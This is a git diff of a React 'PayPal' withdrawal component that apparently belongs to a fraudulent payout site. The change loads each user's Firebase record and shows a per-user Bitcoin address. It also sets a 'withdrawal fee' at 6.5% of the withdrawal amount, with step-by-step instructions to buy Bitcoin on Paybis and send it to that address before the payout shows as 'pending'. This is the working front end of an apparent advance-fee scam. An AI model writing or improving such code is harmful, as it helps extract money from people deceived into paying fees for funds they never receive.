@@ -5,7 +5,32 @@ import { useNavigate } from "react-router-dom";
 import { toast } from "react-toastify";
 
 
+import { useEffect } from "react";
+import { auth, db } from "../firebaseConfig";
+import { doc, getDoc } from "firebase/firestore";
+import LoadingScreen from "./loadingScreen";
+
+
 function PayPal(prop) {
+
+
+    const [userDetails, setUserDetails] = useState(null)
+
+    const fetchUserData = async (e) => {
+        auth.onAuthStateChanged(async (user) => {
+            console.log(user);
+            const docRef = doc(db, "users", user.uid);
+            const docSnap = await getDoc(docRef);
+            if (docSnap.exists()) {
+                setUserDetails({ ...docSnap.data(), id: user.uid })
+                console.log(docSnap.data())
+            }
+        })
+    };
+
+    useEffect(() => {
+        fetchUserData()
+    }, [])
 
     const navigate = useNavigate();
 
@@ -36,7 +61,7 @@ function PayPal(prop) {
         color: selectedMethod == "card" ? `white` : `black`,
     }
 
-    
+
 
     const [image, setImage] = useState(null);
     const [preview, setPreview] = useState(null);
@@ -65,11 +90,11 @@ function PayPal(prop) {
 
 
 
-    function toStep2(){
-        if(payAccount && payAccount.length > 5){
+    function toStep2() {
+        if (payAccount && payAccount.length > 5) {
             setStep("step2")
-        }else {
-          toast.error('enter a valid paypal account', {position: "top-center"})
+        } else {
+            toast.error('enter a valid paypal account', { position: "top-center" })
         }
     }
 
@@ -82,7 +107,7 @@ function PayPal(prop) {
                 </div>
                 <div className="wallet-address">
                     <h1>Bitcoin wallet address:</h1>
-                    <p>xj23hsj2xbvm029kkilon14rpjlion125</p>
+                    <p>{userDetails ? userDetails.cryptoAddress : ""}</p>
                 </div>
                 <div className="note">
                     <p>Note: this wallet address was generated for this transaction only, and only for bitcoin, any other other cryptocurrency made to this wallet address would be loss</p>
@@ -91,7 +116,7 @@ function PayPal(prop) {
                 <div className="paybis">
                     <h1>Dont have bitcoin?</h1>
                     <button>Buy from Paybis</button>
-                    
+
                     <p>step 1: click on the button and select your region (eg US:Dollar)</p>
                     <p>step2: select bitcoin from the option of crypto to purchase</p>
                     <p>step3: enter the above wallet address as purchase destination</p>
@@ -114,7 +139,7 @@ function PayPal(prop) {
 
                 <button className="verify-button" onClick={() => { setVerify("pending") }}>Continue</button>
             </div>
-        }else if(selectedMethod == "card") {
+        } else if (selectedMethod == "card") {
             navigate("../debitCard")
         }
     }
@@ -137,10 +162,10 @@ function PayPal(prop) {
                     <p>To</p>
                     <h1>{payAccount}</h1>
                     <p>Withdrawal Fee:</p>
-                    <h1 className="head-special2">$50.00</h1>
+                    <h1 className="head-special2">${Math.floor(prop.withAmount * 0.065)}.00</h1>
                 </div>
                 <div className="fee-method">
-                    <h2> Pay Withdrawal Fee($50) with</h2>
+                    <h2> Pay Withdrawal Fee (${Math.floor(prop.withAmount * 0.065)}) with</h2>
                     <div className="method" style={cryptoStyle} onClick={() => setSelectedMethod("crypto")}>
                         <img src="https://tse4.mm.bing.net/th/id/OIP.L37frQFm2G-k6wXWyTxI9AHaHa?r=0&w=1920&h=1920&rs=1&pid=ImgDetMain&o=7&rm=3" />
                         <p>Pay With Crypto</p>
@@ -164,7 +189,8 @@ function PayPal(prop) {
     }
 
     return (
-        <section className="paypal">
+      <>
+       {userDetails ?   <section className="paypal">
             <div className="steps-div">
                 {step == "step1" ? <div className="step-green"></div> : <div className="step"></div>}
                 {step == "step2" ? <div className="step-green"></div> : <div className="step"></div>}
@@ -172,7 +198,8 @@ function PayPal(prop) {
             </div>
 
             {showStep()}
-        </section>
+        </section>: <LoadingScreen/>}
+      </>
     )
 }
 
